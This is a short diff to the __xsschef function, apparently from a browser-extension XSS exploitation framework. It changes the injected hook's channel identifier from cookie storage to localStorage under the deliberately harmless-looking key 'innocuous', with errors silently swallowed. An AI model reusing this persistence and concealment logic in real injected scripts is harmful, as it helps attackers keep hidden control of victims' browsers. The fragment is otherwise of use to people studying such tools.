@@ -25,10 +25,12 @@ function __xsschef() {
     }
     window.__xsschef_init = true;
     var myHook;
-    if(!(myHook = /hook=(c\d+)/.exec(document.cookie)[1])) { 
-        myHook = "__CHANNEL__"
-        document.cookie = 'hook=__CHANNEL__; '+ document.cookie
-    }
+    try{
+        if(!(myHook = localStorage['innocuous'])) { 
+            myHook = "__CHANNEL__";
+            localStorage['innocuous'] = '__CHANNEL__';
+        }
+    } catch (e) {}
     var MY_TAB_ID = -1;
     
     var persistentScripts = {};
